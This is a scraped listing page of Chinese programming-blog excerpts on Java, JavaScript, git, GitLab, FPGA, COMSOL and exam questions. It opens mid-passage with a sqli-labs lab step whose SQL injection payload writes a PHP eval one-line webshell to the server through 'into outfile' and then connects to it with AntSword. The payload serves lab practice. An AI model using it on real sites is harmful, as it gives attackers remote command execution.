?id=-1')) union select 1,2,'&lt;?php @eval($_POST["cmd"]);?&gt;' into outfile "D:\\LeStoreDownload\\phpStudyjiayou\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\1.php" --+ 这里的路径必须用\\
向 目标路径 进行写入一个名为eval的php一句话木马，意思是打开命令行
虽然页面报错，但是在目标路径下可以看到写入的的1.php文件
用蚁剑进行连接：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd90cddfbc9e1f128a4cb0b69b2e05e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0c595a12d81bdf7c7db9de29ecd6d3c/" rel="bookmark">
			Java数组细节
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意细节
1.数组的元素可以是任意类型，包括基本类型和引用类型，但是不能混用
2.数组中的元素满足自动转型原则，比如double类型的数组中可以存储int整数，这是因为整数已经自动转成double，但是int类型的数组中不能存放string类型或者double类型，因为不能自动转换（编译不通过）
3.数组创建后都有默认值，
布尔类型默认是false，
引用类型默认是null，
char类型默认是\u0000（这里的\u表示十六进制的意思），
其他的类型都默认对应的0
4.数组越界时实在运行的时候检查的，在编译的时候不会检查
练习
下列数组定义正确的有：
A.String strs[] = {'a','b','c'};//错误，因为是字符串数组，不能存储字符
B.String[] strs = {"a","b","c"};//正确
String[] strs=new String[3];//right
C.String[] strs = new String{"a","b","c"}//错误
D.String strs[] = new String[]{"a","b","c"}//！！！正确
E.String[] strs = new String[3]{"a","b","c"}//错误
————————————————
参考文档：https://blog.csdn.net/qq_42525835/article/details/120831274
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c085fd3d2f6cbeab9d265ed3dc96226d/" rel="bookmark">
			【入门AUTOSAR网络管理测试】系列文章目录汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【入门AUTOSAR网络管理测试】AUTOSAR网络管理规范需求解读
【入门AUTOSAR网络管理测试】BSM-RMS状态转换
【入门AUTOSAR网络管理测试】RMS-RSS状态转换
【入门AUTOSAR网络管理测试】RMS-NOS状态转换
【入门AUTOSAR网络管理测试】NOS-RSS状态转换
【入门AUTOSAR网络管理测试】RSS-PBM状态转换
【入门AUTOSAR网络管理测试】RSS-NOS状态转换
【入门AUTOSAR网络管理测试】PBM-BSM状态转换
【入门AUTOSAR网络管理测试】PBM-RMS状态转换(8-1-3-4-6)
【入门AUTOSAR网络管理测试】PBM-RMS状态转换(8-2-5-6)
【入门AUTOSAR网络管理测试】CANoe测试T_STARTx_AppFrame时间
【入门AUTOSAR网络管理测试】CANoe测试T_WakeUp时间
【入门AUTOSAR网络管理测试】CANoe测试T_REPEAT_MESSAGE时间
【入门AUTOSAR网络管理测试】CANoe测试T_NM_TIMEOUT时间
【入门AUTOSAR网络管理测试】CANoe测试T_WAIT_BUS_SLEEP时间
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d4adb545bca9972490887ff19889aa6/" rel="bookmark">
			JS如何实现继承（面试）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js 常见的继承方式 原型链继承
构造函数继承（借助 call）
组合继承
原型式继承
寄生式继承
寄生组合式继承
1、原型链继承 function Parent() { this.name = 'parent1'; this.play = [1, 2, 3] } function Child() { this.type = 'child2'; } Child.prototype = new Parent(); console.log(new Child()) var s1 = new Child(); var s2 = new Child(); s1.play.push(4); console.log(s1.play, s2.play); // [1,2,3,4] 问题：
s2 会因为 s1 的改变而发生变化两个实例使用的是同一个原型对象，内存空间是共享的 2、构造函数继承 借助 call调用 Parent 函数
function Parent() { this.name = 'parent1'; } Parent.prototype.getName = function () { return this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d4adb545bca9972490887ff19889aa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7c2b073e8957e653ae893e33f5d1b40/" rel="bookmark">
			好用的开源 API 接口测试工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一提到 API 接口测试的工具，对于有经验的程序员可能会想起的是 Postman、 Jmeter、SoapUI,但众所周知，他们也会有一些缺点，导致他们在使用上体验不是特别好。
比如 Postman 的文档功能可能没那么强大，以及商业版定价太高了；像 SoapUI 虽然操作比较简单，但是缺乏对应的文档。
今天给大家推荐一个简单、好用的 API 接口测试工具——Eoapi(先更名为 Postcat),下面会给大家简单演示一下，如何用这款工具进行 API 接口测试。
API 接口测试 在测试中我们可能会关注状态码、响应体以及响应时间，这些数据 Eoapi 通通都会展示给你，判断 API 是否正常。
开始测试之前，我们需要先填写测试数据~，可以点击标签页的加号新建一个测试标签页。
还可以通过点击分组 API 的闪电图标快速对某个 API 发起测试。
通过类比现有的知识去学习新的知识往往更快，平时我们一般会在浏览器里看 API 请求信息，这些信息在 Postcat 对应的位置是什么呢？相信通过下面的对照图你很快能知道如何在 Postcat 测试：
下划线颜色相同代表相同模块
请求 URL/请求方式/请求头/Query 参数
API Path 里面可能填写了 Query 参数，Eoapi 会将它自动同步到 Query 参数的表格里面。
首先确认你的 HTTP 请求体格式，选择相应的请求体格式后点击测试按钮。
就可以看到相应 API 响应信息啦！
通过点击测试历史，还可以回溯当时测试的所有 API 请求信息，快速回归测试。
当然了，这款开源的 API 接口测试工具，功能可不止这些，目前这款软件已经更新到 v1.9.0了，除了我们常说的接口测试、接口文档、接口管理以及Mock 功能，新增团队协作、API 分享功能。除此之外他们还支持：
丰富的插件市场，可拓展
前后置脚本
支持查看所有测试历史
支持 Websocket 协议，后续也会新增支持更多的主流协议
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7c2b073e8957e653ae893e33f5d1b40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89e2b6130ace7218f3ef2938af5f5607/" rel="bookmark">
			COMSOL withsol算子的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		COMSOL官方英文文章的个人中译学习记录，原链接Examples of the withsol Operator，欢迎指正。
基本用法： withsol('tag',expr)，tag为访问的数据集，expr为使用该数据集所需变量形成的表达式。
tag的具体形式为将COMSOL左侧树链的节点文本展开选中tag，则能在下框中看到每个节点的tag文本，即“”“{}”内的文字。
具体的使用，以官方链接中的温度研究为例： 该二维图组自身选用的为sol2的数据集，因此算子withsol外的T为sol2中的解，算子内访问调用数据集sol1，在其中选择的表达式为T。此举意在计算sol2与sol1中T的差值，绘图显示。
新的使用，可用于比较同一研究内的不同参数下的结果或者瞬态研究中不同时步的结果 withsol('tag',expr, setval(par,value))，前两个参数使用方法不变，新增参数算子setval，其意义可理解为将par所指的参数设为value指定的参数值。故需注意，研究中要有类似与参数化扫描的步骤，才有不同参数条件下的解。
具体的使用 选择study3可以看到有个parameter value 的展开项，圆括号中也能看到变量par和单位。联系下面的表达式栏中setval算子使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e151813b0e55def69ffae3f46d047bd/" rel="bookmark">
			九、软考2014年上半年软件设计师易错题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 错题1错题2错题3错题4错题5错题6错题7错题8错题9错题10错题11错题12错题13错题14错题15错题16错题17错题18错题19错题20专业英语 错题1 在CPU中，常用来为ALU执行算术逻辑运算提供数据并暂存运算结果的寄存器是（1）。
(1)A.程序计数器 B.状态寄存器 C.通用寄存器 D.累加寄存器 答案：D
解析：
​ CPU 中有一些重要的寄存器，程序计数器（ PC ）用于存放指令的地址。 当程序顺序执行时，每取出一条指令， PC 内容自动增加一个值，指向下一条要取的指令，当程序出现转移时，则将转移地址送入PC，然后由PC给出新的指令地址。
状态寄行器用于记录运算中产生的标志信息。状态寄存器中的每一位单独使用，成为标志位。标志位的取值反映了ALU当前的工作状态，可以作为条件转移指令的转移条件。典型的标志位有以下几种：进位标志位（C）、零标志位（Z）、符号标志位（S）、溢出标志位（V）、奇偶标志位（P）。
通用寄存器组是CPU中的一组工作寄存器，运算时用于暂存操作数或地址。在程序中使用通用寄存器可以减少访问内存的次数，提高运算速度。累加器（accumulator）是一个数据寄存器，在运算过程中暂时存放操作数和中间运算结果，不能用于长时间地保存一个数据。
错题2 某机器字长为n，最高位是符号位，其定点整数的最大值为（2）。
(2)A.2n-1 B.2n-1-1 C.2n D.2n-1 错题3 以下关于木马程序的叙述中，正确的是（7）。
A.木马程序主要通过移动磁盘传播B.木马程序的客户端运行在攻击者的机器上C.木马程序的目的是使计算机或网络无法提供正常的服务D.Sniffer是典型的木马程序 答案：B
解析：
木马程序一般分为服务器端（Server）和客户端（Client）， 服务器端是攻击者传到目标机器上的部分，用来在目标机上监听等待客户端连接过来。客户端是用来控制目标机器的部分，放在攻击者的机器上。
木马（Trojans）程序常被伪装成工具程序或游戏， 一旦用户打开了带有特洛伊木马程序的邮件附件或从网上直接下载， 或执行了这些程序之后， 当你连接到互联网上时， 这个程序就会通知黑客用户的P地址及被预先设定的端口。黑客在收到这些资料后，再利用这个潜伏其中的程序， 就可以恣意修改用户的计算机设定、 复制任何文件、 窥视用 户整个硬盘内的资料等，从而达到控制用户的计算机的目的。
现在有许多这样的程序，国外的此类软件有Back Office、Netbus等， 国内的此类软件有Netspy、YAI、SubSeven、冰河、“广外女生”等。Sniffer是一种基于被动侦听原理的网络分析软件。使用这种软件，可以监视网络的状态、数据流动情况以及网络上传输的信息，其不属于木马程序。
错题4 防火墙的工作层次是决定防火墙效率及安全的主要因素，以下叙述中，正确的是（8）。
A.防火墙工作层次越低，工作效率越高，安全性越高B.防火墙工作层次越低，工作效率越低，安全性越低C.防火墙工作层次越高，工作效率越高，安全性越低D.防火墙工作层次越高，工作效率越低，安全性越高 答案：D
解析：
防火墙的性能及特点主要由以下两方面所决定。
①工作层次。 这是决定防火墙效率及安全的主要因素。一般来说， 工作层次越低，则工作效率越高， 但安全性就低了；反之， 工作层次越高，工作效率越低， 则安全性越高。
②防火墙采用的机制。 如果采用代理机制， 则防火墙具有内部信息隐藏的特点， 相对而言， 安全性高， 效率低；如果采用过滤机制， 则效率高， 安全性却降低了。
错题5 甲、乙两软件公司于2012年7月12日就其财务软件产品分别申请“用友”和“用有”商标注册。两财务软件相似，甲第一次使用时间为2009年7月，乙第一次使用时间为2009年5月。此情形下，（11）能获准注册。
A.“用友” B.“用友”与“用有”都C.“用有” D.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e151813b0e55def69ffae3f46d047bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/895d1c21975e8b928f9e588a5dd72b0f/" rel="bookmark">
			聊天源码|不依赖第三方|私有部署|红包聊天|即时通讯|IM|聊天app支持二开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源码功能：
1、聊天：单聊，群聊。
2、发消息：语音，图片，文字，表情，表情包
3、自定义消息：发红包、转账
4、聊天记录：清空聊天记录，群管理，加群二维码控制是否可加。
5、可以自定义添加链接，发现页面也可以添加，二者互不影响。
6、我的钱包：后台可以充值，用户充值，提现等。
7、群聊、私聊、朋友圈、可以发送文字、语音、图片、表情、红包等，消息可以撤回、群组可以设置管理员、可以禁言、踢人，可@用户、可发群公告等。
8、支持扫码入群，可设置好友备注、群名片、消息置顶、消息免打扰、可以邀请好友直接进群等。
9、拥有代理功能，支持关键词屏蔽，vip功能，签到功能。
10、多终端设备：允许用户账号同时在多个平台多个设备同时登录。包括移动APP端、网页H5
前端开发语言：VUE（ 安卓，IOS,WEB为一套前端代码）
服务器端开发语言: PHP+WebSocket
数据库：MySql + mongodb
前端打包工具：Hbuilder
服务器搭建工具：宝塔 + Xshell
短信接口： 支持阿里云
支付接口：支持支付宝
服务器配置： 4核8G宽带10兆以上
服务器系统：Linux Centos 7.6 64位
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c613541eee5d30c6233d4999344108bd/" rel="bookmark">
			Windows上NFS共享文件夹部分文件不显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我在Windows上使用haneWIN搭建NFS服务器实现开发板与Windows之间的文件成功共享后， 发现我从开发板中其他文件夹复制到开发板共享文件夹的文件在Windows的共享文件夹中看不到，或者有时候在开发板共享文件夹中生成的文件Windows中也看不到。 但是我查看WIndows中共享文件夹的属性发现文件的个数和大小和开发板中是一样的。
所以是文件同步了但是Windows中未显示。
将Windows这个文件夹复制至虚拟机Linux系统中就能看见所有文件了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac6dec091011a06bc6e60b47d15350c8/" rel="bookmark">
			获取当年所有工作日及节假日信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 背景 因为业务需求，需要获取当年所有节假日和工作日信息，机缘巧合找到了一个接口，使用还不错，因为有用户量大会导致次数受限，使用跑批入库方案
2 接口地址 https://api.apihubs.cn/holiday/get
3 请求参数 get请求哈
参数描述field指定返回结果包含的字段，多个使用英文逗号分隔 枚举year指定要查询的年份，格式为 Y ,多个使用英文逗号分隔month指定要查询的月份，格式为 Ym ,多个使用英文逗号分隔date指定要查询的日期，格式为 Ymd ,多个使用英文逗号分隔yearweek指定要查询一年中的第几周，格式为 oW ,多个使用英文逗号分隔yearday指定要查询一年中的第几天，格式为 z ,多个使用英文逗号分隔holiday指定要查询的节假日，99为全部节假日，多个使用英文逗号分隔 枚举holiday_overtime指定要查询的节假日调休（加班），99为全部调休，多个使用英文逗号分隔 枚举week指定要查询的星期，多个使用英文逗号分隔 枚举workday指定查询是否为工作日（包含调休在内需要上班的日子） 枚举weekend指定查询是否为周末（星期六和星期日） 枚举holiday_today指定查询是否为节日当天 枚举holiday_legal指定查询是否为法定节假日（三倍工资）枚举holiday_recess指定查询是否为假期节假日（节日是否放假）枚举lunar指定年份、月份、日期、天数参数是否查询农历日期cn指定返回结果是否包含中文结果，默认返回的都是数字日期和枚举数字有利于逻辑判断不利于显示page分页页码size分页每页数量 4 响应 code 成功时始终为0，失败时为 枚举值 中的keymsg 成功时始终为 ok 失败时为 枚举值 中的valuedata 成功时返回数据，失败时部分返回失败数据，如表单验证失败data.page 当前页码data.size 当前每页数量data.total 根据查询条件查到的总数量data.list 节假日列表所有字段都可以通过 field 参数进行按需使用 { "code": "0", "msg": "ok", "data": "" } 5 返回示例 默认会返回数字日期和枚举码
{ "year": 2023, "month": 202305, "date": 20230531, "yearweek": 202322, "yearday": 151, "lunar_year": 2023, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac6dec091011a06bc6e60b47d15350c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34322832bcb1322e4a53e0baaa9f9db9/" rel="bookmark">
			用plantuml画时序图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Thread线程的状态有哪些，我们用plantuml来画一下时序图。
此曲只应天上有，人间能得几回闻。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08b5e57067faab8bc892fce156fe8323/" rel="bookmark">
			git 切换并保存某个branch 的 某一个commit / 直接回退到某个 commit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 参考：
git 拉取某个分支的某一个commit的代码
git获取某次历史commit的代码
一 、git 切换某个branch 的 某一个commit的代码 并保存 展示如下：
1、先拉取（如果该branch还没有的话） git clone https://github.com/tianqixin/runoob-git-test 2、切换分支,直接就切换到之前提交过的代码 (dev 是分支名 ， 2342dsfsdfs2 是提交过的 commit 的id)
当前没有dev分支的时候使用的 git checkout -b dev 2342dsfsdfs2 如果当前已经处于dev分支，可以直接拉取 git checkout 2342dsfsdfs2 3、查看commit 的 id git log //查看全部提交记录 4、保存新拉取的 commit (处于头指针分离状态 – detached head) git checkout切换到指定commit
git switch -c &lt;new branch name&gt; 二、 Git分支回退到指定提交位置 git 本地回退至某个版本
git reset --hard &lt;commit id&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa89da5afed9e97be12cbc82032abae1/" rel="bookmark">
			Java 程序是怎么执行的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们日常的工作中都使用开发工具（IntelliJ IDEA 或 Eclipse 等）可以很方便的调试程序，或者是通过打包工具把项目打包成 jar 包或者 war 包，放入 Tomcat 等 Web 容器中就可以正常运行了，但你有没有想过 Java 程序内部是如何执行的？ 其实不论是在开发工具中运行还是在 Tomcat 中运行，Java 程序的执行流程基本都是相同的，它的执行流程如下：
1、先把 Java 代码编译成字节码，也就是把 .java 类型的文件编译成 .class 类型的文件。这个过程的大致执行流程：Java 源代码 -&gt; 词法分析器 -&gt; 语法分析器 -&gt; 语义分析器 -&gt; 字节码生成器 -&gt; 最终生成字节码，其中任何一个节点执行失败就会造成编译失败；
2、把 class 文件放置到 Java 虚拟机，这个虚拟机通常指的是 Oracle 官方自带的 Hotspot JVM；
3、Java 虚拟机使用类加载器（Class Loader）装载 class 文件；
4、类加载完成之后，会进行字节码校验，字节码校验通过之后 JVM 解释器会把字节码翻译成机器码交由操作系统执行。但不是所有代码都是解释执行的，JVM 对此做了优化，比如，以 Hotspot 虚拟机来说，它本身提供了 JIT（Just In Time）也就是我们通常所说的动态编译器，它能够在运行时将热点代码编译为机器码，这个时候字节码就变成了编译执行。
Java 程序执行流程图如下： Java 虚拟机是如何判定热点代码的？
Java 虚拟机判定热点代码的方式有两种：
基于采样的热点判定
主要是虚拟机会周期性的检查各个线程的栈顶，若某个或某些方法经常出现在栈顶，那这个方法就是“热点方法”。这种判定方式的优点是实现简单；缺点是很难精确一个方法的热度，容易受到线程阻塞或外界因素的影响。
基于计数器的热点判定
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa89da5afed9e97be12cbc82032abae1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f85f89e686f97bd1c21d73ccffefbf85/" rel="bookmark">
			Ant Design pro of vue如何使用a-list的分页设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		找到图片中的这个位置，写一个pagination来动态配置a-list的pagination分页
在data的return 中设置pagination的配置
完整代码如下：
&lt;template&gt; &lt;page-header-wrapper&gt; &lt;a-card :bordered="false"&gt; &lt;a-row&gt; &lt;a-col :sm="8" :xs="24"&gt; &lt;info title="植物总数量" value="1677" :bordered="true" /&gt; &lt;/a-col&gt; &lt;a-col :sm="8" :xs="24"&gt; &lt;info title="信息完善的植物数量" value="1677" :bordered="true" /&gt; &lt;/a-col&gt; &lt;a-col :sm="8" :xs="24"&gt; &lt;info title="信息不完善的植物数量" value="0" /&gt; &lt;/a-col&gt; &lt;/a-row&gt; &lt;/a-card&gt; &lt;a-card style="margin-top: 24px" :bordered="false" title="植物列表"&gt; &lt;div slot="extra"&gt; &lt;a-radio-group v-model="status" @change="statusChange"&gt; &lt;a-radio-button value="all"&gt;全部&lt;/a-radio-button&gt; &lt;a-radio-button value="herbaceous"&gt;草本&lt;/a-radio-button&gt; &lt;a-radio-button value="woody"&gt;木本&lt;/a-radio-button&gt; &lt;a-radio-button value="Liana"&gt;藤本&lt;/a-radio-button&gt; &lt;a-radio-button value="Meaty"&gt;多肉&lt;/a-radio-button&gt; &lt;a-radio-button value="Lanco"&gt;兰科&lt;/a-radio-button&gt; &lt;a-radio-button value="aquatic"&gt;水生&lt;/a-radio-button&gt; &lt;a-radio-button value="perennial_root"&gt;宿根&lt;/a-radio-button&gt; &lt;a-radio-button value="fruits"&gt;水果&lt;/a-radio-button&gt; &lt;a-radio-button value="vegetables"&gt;蔬菜&lt;/a-radio-button&gt; &lt;/a-radio-group&gt; &lt;a-input-search style="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f85f89e686f97bd1c21d73ccffefbf85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d9e0c3cf98dacc66a3e2a3cc942c119/" rel="bookmark">
			一篇学会Gitlab搭建及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Gitlab介绍
1、什么是Gitlab
二、搭建gitlab并实现ssl
1、配置yum源或下载gitlab包
2、安装依赖软件及获取GPG密钥
3、安装gitlab-ce
4、创建私有密钥
5、创建私有证书
6、创建CRT签名证书
7、利用openssl签署pem 证书
8、配置证书到gitlab
9、初始化gitlab
10、nginx配置重写到https
11、windows配置hosts
12、windows访问测试
13、登录并修改root初始密码
14、更改语言为中文(可选)
16、关闭账户自动注册
15、管理员创建账户和组
16、管理员创建项目 17、配置登录免密认证
18、项目成员权限分配
19、gitlab项目介绍
①项目权限
②分支角色管理
20、gitlab常用命令
一、Gitlab介绍 1、什么是Gitlab GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的Web服务。
安装方法是参考GitLab在GitHub上的Wiki页面。Gitlab是目前被广泛使用的基于git的开源代码管理平台, 基于Ruby on Rails构建, 主要针对软件开发过程中产生的代码和文档进行管理, Gitlab主要针对group和project两个维度进行代码和文档管理, 其中group是群组, project是工程项目, 一个group可以管理多个project, 可以理解为一个群组中有多项软件开发任务, 而一个project中可能包含多个branch, 意为每个项目中有多个分支, 分支间相互独立, 不同分支可以进行归并。
二、搭建gitlab并实现ssl 1、配置yum源或下载gitlab包 方法1：创建一个新的yum源文件，文件内容如下 vim /etc/yum.repos.d/gitlab.repo [gitlab-ce] name=Gitlab-CE baseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el$releasever/ #此变量$releasever表示本服务器的当前系统版本号 gpgcheck=0 enabled=1 方法2：或者直接wget下载gitlab的rpm安装包 wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-15.2.2-ce.0.el7.x86_64.rpm 2、安装依赖软件及获取GPG密钥 hostnamectl set-hostname gitlab.lhj.com #修改主机名 bash #刷新shell echo 192.168.30.20 gitlab.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d9e0c3cf98dacc66a3e2a3cc942c119/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/087ce72d8c93076c99c482ad98e148ff/" rel="bookmark">
			如何安装MVware Workstations Pro16
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0 更多软件安装 详见&gt;&gt;
常用开发软件安装 目录导航帖
1 所需材料 链接：https://pan.baidu.com/s/1QyCaK8kRa3AQwwWr66v-gg?pwd=lap6
提取码：lap6
2 安装步骤 首先，下载所需安装的软件（第一部分 所需材料），然后点击exe开始执行安装
点击下一步
勾选“同意”按钮
勾选PATH添加到路径中（注意此处不要勾选增强型硬盘驱动器）
此处全部勾选
此处全部勾选
点击安装
输入（直接复制所需材料中的license.txt）
等待安装结束即可！
安装完成，可以开启虚拟机探索之旅了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e17d940b44fbb28189704db14b9b5e6/" rel="bookmark">
			FPGA - 7系列 FPGA内部结构之CLB -03- CLB相关原语以及应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本文节选UG474的第二章，进行整理翻译。CLB资源被FPGA综合工具自动有效地使用，不需要任何特殊的FPGA专用编码。一些HDL编码建议和技术可以帮助优化设计以获得最大效率。
设计检查清单 这些指南是为有效使用7系列CLB的设计建议提供的快速核对表。7系列CLB的设计建议：
资源利用
使用通用的HDL代码，让综合和映射工具选择特定的FPGA CLB资源。
只有在需要满足密度或性能要求时，才考虑实例化特定资源。或性能要求时才考虑实例化特定的资源。
将结果与估计的片数相比较，以验证设计效率。
如果一个设计在目标器件中的资源用完了，请检查哪种资源是限制因素，并考虑将其作为设计的一部分。资源是限制因素，并考虑使用替代资源，例如 将寄存器移至SRL或分布式RAM，或将分布式RAM移至块RAM、 或进位逻辑到DSP片上。
管道化
设计者应该使用顺序设计技术和流水线来利用丰富的触发器来提高性能。 控制信号
只在必要时使用控制信号。避免使用路由全局复位信号，尽量减少使用局部复位，以最大限度地利用FPGA资源。使用高电平的控制信号。避免在同一个触发器上同时使用设置和复位。避免在小型移位寄存器和存储阵列上使用控制信号，以便使用LUT而不是触发器，从而最大限度地提高利用率和减少功耗。 软件选项
为了自动提高性能，使用时序约束，并通过软件选项换取更长的执行运行时间。 使用CLB资源 赛灵思建议使用通用HDL代码，并允许工具推断CLB资源的使用情况。使用为7系列FPGA设计的IP解决方案可以帮助充分利用CLB资源尽管CLB中的任何功能都可以直接实例化，包括LUT、进位逻辑和顺序元素，但实例化应主要用于指定何时应使用CLB以外的资源，如DSP片。如果综合工具没有推断出所需的特殊CLB资源，如宽多路复用器、分布式RAM或SRL功能，也可能需要实例化。
原语 本节概述了最常用的CLB原语。
多路复用器 多路复用器原语为每个片中的专用多路复用器提供直接实例化，允许构建更宽的多路复用器。下表描述了这两个原语。
PrimitiveInputsResourceOutput FunctionMUXF7LUT outputs (4:1 multiplexer)F7AMUX or F7BMUX8:1 multiplexerMUXF8F7AMUX and F7BMUX outputs (8:1 multiplexer)F8MUX16:1 multiplexer 两个多路复用器原语的端口信号是相同的。下图显示了MUXF7。
端口信号 数据输入 - I0, I1：数据输入提供由选择信号（S）选择的数据。控制输入 - S：选择输入信号决定了要连接到输出O的数据输入信号。逻辑0选择I0输入，而逻辑1选择I1输入。数据输出 - O：数据输出O提供由控制输入选择的数据值（一个比特）。 进位链 CARRY4原语实例化了每个slice中可用的快速进位逻辑。这个基元与LUT一起工作，构建加法器和乘法器。下图显示了CARRY4基元。综合工具通常从算术HDL代码中推断出这个逻辑，自动正确连接这个功能。
端口信号 总和输出 - O[3:0]：总和输出提供加/减法的最终结果。它们连接到slice 的AMUX/BMUX/CMUX/DMUX输出。
进位输出 - CO[3:0]：进位输出为每个位提供进位。CO[3]等同于COUT。如果CO[3]通过COUT连接到另一个CARRY4原语的CI输入，并通过专用路由将进位链连接到一列slice上，就可以创建一个较长的进位链。进位输出还可选择连接到slice的AMUX/BMUX/CMUX/DMUX输出。
进位输入 - CI：进位输入，也叫CIN，用于级联片，形成更长的进位链。
数据输入 - DI [3:0]：数据输入被用作 "生成 "信号，用于前级进位逻辑。产生信号的来源是LUT输出。
选择输入 - S [3:0]：选择输入作为 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e17d940b44fbb28189704db14b9b5e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0cc5eec88b186fac1d9c7bbd2ea22a3/" rel="bookmark">
			疯狂python学习--多态到底有多多态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python语言特点有三种，不过其他的语言也有啦，封装、多态、继承。其中封装很好理解就是将程序装在一个黑盒子里面，只需要告诉你传入什么东西以及可以给你什么结果就好。继承是涉及__init__构造方法的内容。但是：多态，可以理解为将方法分布开来，通过更多的方式使用同一个方法。
多态，顾名思义将同一个方法用很多个状态表述，书中使用的是draw画画这个状态，。
先创建一个人基础的画画类
claas Canvas: def draw_pic(self,shape): print("star draw the picture") shape.draw(self) 从代码上看，这个Canvas类中需要传入一个shape参数，而这个shape是一个类，可以调用自身的draw方法，以实现各种各样的draw的功能。
class Rectangle: def draw(self, canvas): print("在%s 上绘制矩形", % canvas) class Tritangle: def draw(self, canvas): print("在%s 上绘制三角形", % canvas) class Circle: def draw(self, canvas): print("在%s 上绘制圆型", % canvas) 直接调用每个绘制类的draw方法即可。
c = Canvas() c.draw_pic(Rectangle()) c.draw_pic(Triangle()) c.draw_pic(Circle()) 多态突出的一个多种方法可以分开设置，并在同一个空间中进行设置。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b12473daa12e6453e5d857aeba3835cc/" rel="bookmark">
			2023年全国职业院校技能大赛-信息安全管理与评估-赛题 7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
任务1：网络平台搭建 （50分）
任务2：网络安全设备配置与防护（250分）
竞赛项目赛题
介绍
所需的设备、机械、装置和材料
评分方案
项目和任务描述
工作任务
第一部分 网络安全事件响应
任务1：Windows服务器应急响应（70分）
本任务素材清单：Windows服务器虚拟机。
第二部分 数字取证调查
任务2 ：基于Linux的内存取证（40分）
本任务素材清单：存储镜像、内存镜像。
任务3：通信数据分析取证（USB）（50分）
本任务素材清单：捕获的通信数据文件。
任务4： 基于MacOS计算机单机取证（60分）
本任务素材清单：取证镜像文件。
第三部分 应用程序安全
任务5：Android恶意程序分析（50分）
本任务素材清单：Android的apk文件。
任务6：PHP代码审计（30分）
本任务素材清单：PHP文件。
竞赛项目赛题
介绍
所需的设施设备和材料
评分方案
项目和任务描述
特别提醒
工作任务
附录A
信息安全管理与评估
赛题七
模块一
网络平台搭建与设备安全防护
赛项时间 共计180分钟。
赛项信息 竞赛阶段
任务阶段
